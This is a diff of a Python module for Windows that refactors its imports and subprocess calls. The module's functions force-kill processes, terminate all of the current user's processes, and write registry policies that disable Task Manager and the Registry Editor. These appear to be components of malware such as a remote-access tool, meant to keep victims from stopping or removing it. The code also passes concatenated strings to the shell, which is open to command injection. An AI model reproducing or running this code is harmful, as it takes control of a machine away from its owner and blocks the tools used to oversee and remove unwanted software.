@@ -1,7 +1,7 @@
 # Import modules
 
-from subprocess import Popen, call
-from win32gui import GetWindowText, GetForegroundWindow
+import win32gui
+import subprocess
 
 
 # Ends the selected process
@@ -9,30 +9,30 @@ from win32gui import GetWindowText, GetForegroundWindow
 def KillProcess(Process):
 	if not Process.endswith('.exe'):
 		Process = Process + '.exe'
-	call('taskkill /f /im ' + Process, shell=True)
+	subprocess.check_output('taskkill /f /im ' + Process, shell=True)
 
 
 # Gets the title of the active window
 
 def WindowTitle():
-	return GetWindowText(GetForegroundWindow())
+	return win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 
 # Stops all processes
 
 def TaskkillAll(CurrentName):
-	call('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
+	subprocess.check_output('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
 		shell=True)
-	call('explorer.exe',
+	subprocess.check_output('explorer.exe',
 		shell=True)
 
 
 # Disabling Task Manager and Regedit
 
 def RegeditDisableTaskManager():
-	Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
+	subprocess.check_output('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
 		shell=True)
 
 def RegeditDisableRegistryTools():
-	Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',
+	subprocess.check_output('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',
 		shell=True)
